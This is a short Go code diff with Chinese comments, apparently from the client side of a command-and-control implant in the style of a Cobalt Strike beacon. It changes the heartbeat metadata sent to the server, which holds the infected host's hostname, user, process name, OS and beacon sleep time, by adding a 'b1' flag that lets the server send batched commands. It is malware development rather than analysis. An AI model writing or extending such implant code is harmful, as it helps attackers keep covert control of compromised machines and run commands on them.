@@ -53,9 +53,13 @@ func MakeMetaInfo() []byte {
 	// 【统一心跳】OSInfo 追加第 5 个 \t 字段上报 beacon sleep 秒数（CS 模型单一事实来源）：
 	// 服务端 FirstBlood 据此注册离线检测器阈值（旧服务端忽略多余字段，双向兼容；
 	// 旧客户端无此字段时服务端回退监听器配置）
-	osInfo := fmt.Sprintf("%s\t%s\t%s\t%s\t%d", hostName, currentUser, processName, osTypeName(), config.SleepSeconds())
-	if len(osInfo) > 80 {
-		osInfo = osInfo[:80]
+	// 【B5 批量命令】第 6 段追加能力标记 "b1"：上报后服务端(配置开启时)以 CMD_BATCH
+	// 帧批量下发轮询命令；旧服务端只按 \t split 取前几段，同样无影响（双向兼容）。
+	// 截断上限 80→84：保证 b1 标记不被截掉（3 字节）；两处构造(packet/utils)必须一致,
+	// 否则本地 cid 与服务端 MD5 不一致 → 会话密钥派生 uid 错位 → 命令解密全挂
+	osInfo := fmt.Sprintf("%s\t%s\t%s\t%s\t%d\tb1", hostName, currentUser, processName, osTypeName(), config.SleepSeconds())
+	if len(osInfo) > 84 {
+		osInfo = osInfo[:84]
 	}
 	osInfoBytes := []byte(osInfo)
 
